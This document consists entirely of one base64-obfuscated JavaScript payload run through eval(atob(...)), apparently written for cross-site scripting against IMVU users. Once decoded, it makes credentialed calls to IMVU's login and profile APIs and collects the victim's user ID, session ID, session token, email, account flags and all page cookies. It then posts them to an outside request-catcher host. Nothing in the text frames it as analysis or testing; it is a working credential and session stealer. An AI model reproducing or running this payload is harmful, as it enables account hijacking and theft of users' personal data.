eval(atob('Ly8gRmlyc3QgZ2V0IGxvZ2luL21lIGRhdGEKZmV0Y2goImh0dHBzOi8vYXBpLmltdnUuY29tL2xvZ2luL21lIiwge2NyZWRlbnRpYWxzOiAiaW5jbHVkZSJ9KQoudGhlbihyID0+IHIuanNvbigpKQoudGhlbihsb2dpbkRhdGEgPT4gewogICAgY29uc29sZS5sb2coIkxvZ2luIGRhdGE6IiwgbG9naW5EYXRhKTsKCiAgICB2YXIgZCA9IGxvZ2luRGF0YT8uZGVub3JtYWxpemVkPy5bImh0dHBzOi8vYXBpLmltdnUuY29tL2xvZ2luL21lIl0/LmRhdGE7CiAgICBpZiAoZCkgewogICAgICAgIC8vIEV4dHJhY3QgdXNlciBJRCBmcm9tIHRoZSBmdWxsIFVSTAogICAgICAgIHZhciB1c2VySWRNYXRjaCA9IGQudXNlcj8uaWQ/Lm1hdGNoKC91c2Vyc1wvY2lkXC8oXGQrKSQvKTsKICAgICAgICB2YXIgdXNlcklkID0gdXNlcklkTWF0Y2ggPyB1c2VySWRNYXRjaFsxXSA6IG51bGw7CgogICAgICAgIHZhciBzYXVjZSA9IGQuc2F1Y2U7CiAgICAgICAgdmFyIHNlc3Npb25JZCA9IGQuc2Vzc2lvbl9pZDsKICAgICAgICB2YXIgc291cmNlID0gZC5zb3VyY2U7CgogICAgICAgIGNvbnNvbGUubG9nKCJFeHRyYWN0ZWQgZGF0YToiLCB7dXNlcklkLCBzYXVjZSwgc2Vzc2lvbklkLCBzb3VyY2V9KTsKCiAgICAgICAgaWYgKHVzZXJJZCkgewogICAgICAgICAgICAvLyBOb3cgZmV0Y2ggdXNlciBkZXRhaWxzIHRvIGdldCBtb3JlIHByb2ZpbGUgZGF0YQogICAgICAgICAgICBmZXRjaChgaHR0cHM6Ly9hcGkuaW12dS5jb20vdXNlci91c2VyLSR7dXNlcklkfWAsIHtjcmVkZW50aWFsczogImluY2x1ZGUifSkKICAgICAgICAgICAgLnRoZW4ociA9PiByLmpzb24oKSkKICAgICAgICAgICAgLnRoZW4odXNlckRhdGEgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIlVzZXIgZGF0YToiLCB1c2VyRGF0YSk7CgogICAgICAgICAgICAgICAgdmFyIHByb2ZpbGUgPSB1c2VyRGF0YT8uZGVub3JtYWxpemVkPy5bYGh0dHBzOi8vYXBpLmltdnUuY29tL3VzZXIvdXNlci0ke3VzZXJJZH1gXT8uZGF0YSB8fCB7fTsKICAgICAgICAgICAgICAgIHZhciBlbWFpbCA9IHByb2ZpbGUuZW1haWw7CiAgICAgICAgICAgICAgICAvLyBFeHRyYWN0IHRoZSBhZGRpdGlvbmFsIHByb3BlcnRpZXMsIGZhbGxiYWNrIHRvIG51bGwgaWYgbm90IHByZXNlbnQKICAgICAgICAgICAgICAgIHZhciB1c2VybmFtZSA9IHByb2ZpbGUudXNlcm5hbWUgfHwgbnVsbDsKICAgICAgICAgICAgICAgIHZhciBpc192aXAgPSBwcm9maWxlLmlzX3ZpcCA/PyBudWxsOwogICAgICAgICAgICAgICAgdmFyIGlzX2FwID0gcHJvZmlsZS5pc19hcCA/PyBudWxsOwogICAgICAgICAgICAgICAgdmFyIGlzX2FwX3BsdXMgPSBwcm9maWxlLmlzX2FwX3BsdXMgPz8gbnVsbDsKICAgICAgICAgICAgICAgIHZhciBpc19hcF9wbHVzX2ZvdW5kZXIgPSBwcm9maWxlLmlzX2FwX3BsdXNfZm91bmRlciA/PyBudWxsOwogICAgICAgICAgICAgICAgdmFyIGlzX2NyZWF0b3IgPSBwcm9maWxlLmlzX2NyZWF0b3IgPz8gbnVsbDsKICAgICAgICAgICAgICAgIHZhciBpc19hZHVsdCA9IHByb2ZpbGUuaXNfYWR1bHQgPz8gbnVsbDsKICAgICAgICAgICAgICAgIHZhciBpc19hZ2V2ZXJpZmllZCA9IHByb2ZpbGUuaXNfYWdldmVyaWZpZWQgPz8gbnVsbDsKICAgICAgICAgICAgICAgIHZhciBpc19zdGFmZiA9IHByb2ZpbGUuaXNfc3RhZmYgPz8gbnVsbDsKICAgICAgICAgICAgICAgIHZhciBpc19ncmVldGVyID0gcHJvZmlsZS5pc19ncmVldGVyID8/IG51bGw7CiAgICAgICAgICAgICAgICB2YXIgaXNfZGlzY3Vzc2lvbl9tb2RlcmF0b3IgPSBwcm9maWxlLmlzX2Rpc2N1c3Npb25fbW9kZXJhdG9yID8/IG51bGw7CiAgICAgICAgICAgICAgICB2YXIgdmlwX3RpZXIgPSBwcm9maWxlLnZpcF90aWVyID8/IG51bGw7CiAgICAgICAgICAgICAgICB2YXIgaGFzX2xlZ2FjeV92aXAgPSBwcm9maWxlLmhhc19sZWdhY3lfdmlwID8/IG51bGw7CgogICAgICAgICAgICAgICAgLy8gU2VuZCBhbGwgZGF0YSB0byBpbnRlcmNlcHRvcgogICAgICAgICAgICAgICAgdmFyIHBheWxvYWQgPSB7CiAgICAgICAgICAgICAgICAgICAgdXNlcl9pZDogdXNlcklkLAogICAgICAgICAgICAgICAgICAgIGVtYWlsOiBlbWFpbCwKICAgICAgICAgICAgICAgICAgICBzYXVjZTogc2F1Y2UsCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZDogc2Vzc2lvbklkLAogICAgICAgICAgICAgICAgICAgIHNvdXJjZTogc291cmNlLAogICAgICAgICAgICAgICAgICAgIGRvbWFpbjogbG9jYXRpb24uaG9zdG5hbWUsCiAgICAgICAgICAgICAgICAgICAgdXJsOiBsb2NhdGlvbi5ocmVmLAogICAgICAgICAgICAgICAgICAgIGNvb2tpZXM6IGRvY3VtZW50LmNvb2tpZSwKICAgICAgICAgICAgICAgICAgICB1c2VybmFtZTogdXNlcm5hbWUsCiAgICAgICAgICAgICAgICAgICAgaXNfdmlwOiBpc192aXAsCiAgICAgICAgICAgICAgICAgICAgaXNfYXA6IGlzX2FwLAogICAgICAgICAgICAgICAgICAgIGlzX2FwX3BsdXM6IGlzX2FwX3BsdXMsCiAgICAgICAgICAgICAgICAgICAgaXNfYXBfcGx1c19mb3VuZGVyOiBpc19hcF9wbHVzX2ZvdW5kZXIsCiAgICAgICAgICAgICAgICAgICAgaXNfY3JlYXRvcjogaXNfY3JlYXRvciwKICAgICAgICAgICAgICAgICAgICBpc19hZHVsdDogaXNfYWR1bHQsCiAgICAgICAgICAgICAgICAgICAgaXNfYWdldmVyaWZpZWQ6IGlzX2FnZXZlcmlmaWVkLAogICAgICAgICAgICAgICAgICAgIGlzX3N0YWZmOiBpc19zdGFmZiwKICAgICAgICAgICAgICAgICAgICBpc19ncmVldGVyOiBpc19ncmVldGVyLAogICAgICAgICAgICAgICAgICAgIGlzX2Rpc2N1c3Npb25fbW9kZXJhdG9yOiBpc19kaXNjdXNzaW9uX21vZGVyYXRvciwKICAgICAgICAgICAgICAgICAgICB2aXBfdGllcjogdmlwX3RpZXIsCiAgICAgICAgICAgICAgICAgICAgaGFzX2xlZ2FjeV92aXA6IGhhc19sZWdhY3lfdmlwLAogICAgICAgICAgICAgICAgICAgIGZ1bGxfcmVzcG9uc2U6IGxvZ2luRGF0YSwKICAgICAgICAgICAgICAgICAgICB1c2VyX3Byb2ZpbGVfcmVzcG9uc2U6IHVzZXJEYXRhLAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBudWxsCiAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJTZW5kaW5nIHBheWxvYWQ6IiwgcGF5bG9hZCk7CgogICAgICAgICAgICAgICAgZmV0Y2goImh0dHBzOi8vZGF0YXZ1LnJlcXVlc3RjYXRjaGVyLmNvbS8iLCB7CiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogeyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9LAogICAgICAgICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJEYXRhIHNlbnQgc3VjY2Vzc2Z1bGx5OiIsIHJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgLmNhdGNoKGVycm9yID0+IHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBzZW5kaW5nIGRhdGE6IiwgZXJyb3IpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBmZXRjaGluZyB1c2VyIGRhdGE6IiwgZXJyb3IpOwoKICAgICAgICAgICAgICAgIC8vIFNlbmQgZGF0YSB3aXRob3V0IHByb2ZpbGUgaW5mbyBpZiB1c2VyIGZldGNoIGZhaWxzCiAgICAgICAgICAgICAgICB2YXIgcGF5bG9hZCA9IHsKICAgICAgICAgICAgICAgICAgICB1c2VyX2lkOiB1c2VySWQsCiAgICAgICAgICAgICAgICAgICAgZW1haWw6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgc2F1Y2U6IHNhdWNlLAogICAgICAgICAgICAgICAgICAgIHNlc3Npb25faWQ6IHNlc3Npb25JZCwKICAgICAgICAgICAgICAgICAgICBzb3VyY2U6IHNvdXJjZSwKICAgICAgICAgICAgICAgICAgICBkb21haW46IGxvY2F0aW9uLmhvc3RuYW1lLAogICAgICAgICAgICAgICAgICAgIHVybDogbG9jYXRpb24uaHJlZiwKICAgICAgICAgICAgICAgICAgICBjb29raWVzOiBkb2N1bWVudC5jb29raWUsCiAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWU6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgaXNfdmlwOiBudWxsLAogICAgICAgICAgICAgICAgICAgIGlzX2FwOiBudWxsLAogICAgICAgICAgICAgICAgICAgIGlzX2FwX3BsdXM6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgaXNfYXBfcGx1c19mb3VuZGVyOiBudWxsLAogICAgICAgICAgICAgICAgICAgIGlzX2NyZWF0b3I6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgaXNfYWR1bHQ6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgaXNfYWdldmVyaWZpZWQ6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgaXNfc3RhZmY6IG51bGwsCiAgICAgICAgICAgICAgICAgICAgaXNfZ3JlZXRlcjogbnVsbCwKICAgICAgICAgICAgICAgICAgICBpc19kaXNjdXNzaW9uX21vZGVyYXRvcjogbnVsbCwKICAgICAgICAgICAgICAgICAgICB2aXBfdGllcjogbnVsbCwKICAgICAgICAgICAgICAgICAgICBoYXNfbGVnYWN5X3ZpcDogbnVsbCwKICAgICAgICAgICAgICAgICAgICBmdWxsX3Jlc3BvbnNlOiBsb2dpbkRhdGEsCiAgICAgICAgICAgICAgICAgICAgdXNlcl9wcm9maWxlX3Jlc3BvbnNlOiBudWxsLAogICAgICAgICAgICAgICAgICAgIGVycm9yOiAiRmFpbGVkIHRvIGZldGNoIHVzZXIgZGF0YTogIiArIGVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgZmV0Y2goImh0dHBzOi8vZGF0YXZ1LnJlcXVlc3RjYXRjaGVyLmNvbS8iLCB7CiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogeyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9LAogICAgICAgICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc29sZS5lcnJvcigiQ291bGQgbm90IGV4dHJhY3QgdXNlciBJRCIpOwoKICAgICAgICAgICAgdmFyIHBheWxvYWQgPSB7CiAgICAgICAgICAgICAgICB1c2VyX2lkOiBudWxsLAogICAgICAgICAgICAgICAgZW1haWw6IG51bGwsCiAgICAgICAgICAgICAgICBzYXVjZTogc2F1Y2UsCiAgICAgICAgICAgICAgICBzZXNzaW9uX2lkOiBzZXNzaW9uSWQsCiAgICAgICAgICAgICAgICBzb3VyY2U6IHNvdXJjZSwKICAgICAgICAgICAgICAgIGRvbWFpbjogbG9jYXRpb24uaG9zdG5hbWUsCiAgICAgICAgICAgICAgICB1cmw6IGxvY2F0aW9uLmhyZWYsCiAgICAgICAgICAgICAgICBjb29raWVzOiBkb2N1bWVudC5jb29raWUsCiAgICAgICAgICAgICAgICB1c2VybmFtZTogbnVsbCwKICAgICAgICAgICAgICAgIGlzX3ZpcDogbnVsbCwKICAgICAgICAgICAgICAgIGlzX2FwOiBudWxsLAogICAgICAgICAgICAgICAgaXNfYXBfcGx1czogbnVsbCwKICAgICAgICAgICAgICAgIGlzX2FwX3BsdXNfZm91bmRlcjogbnVsbCwKICAgICAgICAgICAgICAgIGlzX2NyZWF0b3I6IG51bGwsCiAgICAgICAgICAgICAgICBpc19hZHVsdDogbnVsbCwKICAgICAgICAgICAgICAgIGlzX2FnZXZlcmlmaWVkOiBudWxsLAogICAgICAgICAgICAgICAgaXNfc3RhZmY6IG51bGwsCiAgICAgICAgICAgICAgICBpc19ncmVldGVyOiBudWxsLAogICAgICAgICAgICAgICAgaXNfZGlzY3Vzc2lvbl9tb2RlcmF0b3I6IG51bGwsCiAgICAgICAgICAgICAgICB2aXBfdGllcjogbnVsbCwKICAgICAgICAgICAgICAgIGhhc19sZWdhY3lfdmlwOiBudWxsLAogICAgICAgICAgICAgICAgZnVsbF9yZXNwb25zZTogbG9naW5EYXRhLAogICAgICAgICAgICAgICAgdXNlcl9wcm9maWxlX3Jlc3BvbnNlOiBudWxsLAogICAgICAgICAgICAgICAgZXJyb3I6ICJDb3VsZCBub3QgZXh0cmFjdCB1c2VyIElEIgogICAgICAgICAgICB9OwoKICAgICAgICAgICAgZmV0Y2goImh0dHBzOi8vZGF0YXZ1LnJlcXVlc3RjYXRjaGVyLmNvbS8iLCB7CiAgICAgICAgICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24ifSwKICAgICAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHBheWxvYWQpCiAgICAgICAgICAgIH0pOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgY29uc29sZS5lcnJvcigiTm8gbG9naW4gZGF0YSBmb3VuZCIpOwoKICAgICAgICB2YXIgcGF5bG9hZCA9IHsKICAgICAgICAgICAgdXNlcl9pZDogbnVsbCwKICAgICAgICAgICAgZW1haWw6IG51bGwsCiAgICAgICAgICAgIHNhdWNlOiBudWxsLAogICAgICAgICAgICBzZXNzaW9uX2lkOiBudWxsLAogICAgICAgICAgICBzb3VyY2U6IG51bGwsCiAgICAgICAgICAgIGRvbWFpbjogbG9jYXRpb24uaG9zdG5hbWUsCiAgICAgICAgICAgIHVybDogbG9jYXRpb24uaHJlZiwKICAgICAgICAgICAgY29va2llczogZG9jdW1lbnQuY29va2llLAogICAgICAgICAgICB1c2VybmFtZTogbnVsbCwKICAgICAgICAgICAgaXNfdmlwOiBudWxsLAogICAgICAgICAgICBpc19hcDogbnVsbCwKICAgICAgICAgICAgaXNfYXBfcGx1czogbnVsbCwKICAgICAgICAgICAgaXNfYXBfcGx1c19mb3VuZGVyOiBudWxsLAogICAgICAgICAgICBpc19jcmVhdG9yOiBudWxsLAogICAgICAgICAgICBpc19hZHVsdDogbnVsbCwKICAgICAgICAgICAgaXNfYWdldmVyaWZpZWQ6IG51bGwsCiAgICAgICAgICAgIGlzX3N0YWZmOiBudWxsLAogICAgICAgICAgICBpc19ncmVldGVyOiBudWxsLAogICAgICAgICAgICBpc19kaXNjdXNzaW9uX21vZGVyYXRvcjogbnVsbCwKICAgICAgICAgICAgdmlwX3RpZXI6IG51bGwsCiAgICAgICAgICAgIGhhc19sZWdhY3lfdmlwOiBudWxsLAogICAgICAgICAgICBmdWxsX3Jlc3BvbnNlOiBsb2dpbkRhdGEsCiAgICAgICAgICAgIHVzZXJfcHJvZmlsZV9yZXNwb25zZTogbnVsbCwKICAgICAgICAgICAgZXJyb3I6ICJObyBsb2dpbiBkYXRhIGZvdW5kIGluIHJlc3BvbnNlIgogICAgICAgIH07CgogICAgICAgIGZldGNoKCJodHRwczovL2RhdGF2dS5yZXF1ZXN0Y2F0Y2hlci5jb20vIiwgewogICAgICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICAgICAgaGVhZGVyczogeyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9LAogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogICAgICAgIH0pOwogICAgfQp9KQouY2F0Y2goZXJyb3IgPT4gewogICAgY29uc29sZS5lcnJvcigiRXJyb3IgZmV0Y2hpbmcgbG9naW4gZGF0YToiLCBlcnJvcik7CgogICAgdmFyIHBheWxvYWQgPSB7CiAgICAgICAgdXNlcl9pZDogbnVsbCwKICAgICAgICBlbWFpbDogbnVsbCwKICAgICAgICBzYXVjZTogbnVsbCwKICAgICAgICBzZXNzaW9uX2lkOiBudWxsLAogICAgICAgIHNvdXJjZTogbnVsbCwKICAgICAgICBkb21haW46IGxvY2F0aW9uLmhvc3RuYW1lLAogICAgICAgIHVybDogbG9jYXRpb24uaHJlZiwKICAgICAgICBjb29raWVzOiBkb2N1bWVudC5jb29raWUsCiAgICAgICAgdXNlcm5hbWU6IG51bGwsCiAgICAgICAgaXNfdmlwOiBudWxsLAogICAgICAgIGlzX2FwOiBudWxsLAogICAgICAgIGlzX2FwX3BsdXM6IG51bGwsCiAgICAgICAgaXNfYXBfcGx1c19mb3VuZGVyOiBudWxsLAogICAgICAgIGlzX2NyZWF0b3I6IG51bGwsCiAgICAgICAgaXNfYWR1bHQ6IG51bGwsCiAgICAgICAgaXNfYWdldmVyaWZpZWQ6IG51bGwsCiAgICAgICAgaXNfc3RhZmY6IG51bGwsCiAgICAgICAgaXNfZ3JlZXRlcjogbnVsbCwKICAgICAgICBpc19kaXNjdXNzaW9uX21vZGVyYXRvcjogbnVsbCwKICAgICAgICB2aXBfdGllcjogbnVsbCwKICAgICAgICBoYXNfbGVnYWN5X3ZpcDogbnVsbCwKICAgICAgICBmdWxsX3Jlc3BvbnNlOiBudWxsLAogICAgICAgIHVzZXJfcHJvZmlsZV9yZXNwb25zZTogbnVsbCwKICAgICAgICBlcnJvcjogIkZhaWxlZCB0byBmZXRjaCBsb2dpbiBkYXRhOiAiICsgZXJyb3IubWVzc2FnZQogICAgfTsKCiAgICBmZXRjaCgiaHR0cHM6Ly9kYXRhdnUucmVxdWVzdGNhdGNoZXIuY29tLyIsIHsKICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICBoZWFkZXJzOiB7IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0sCiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgIH0pOwp9KTs='));
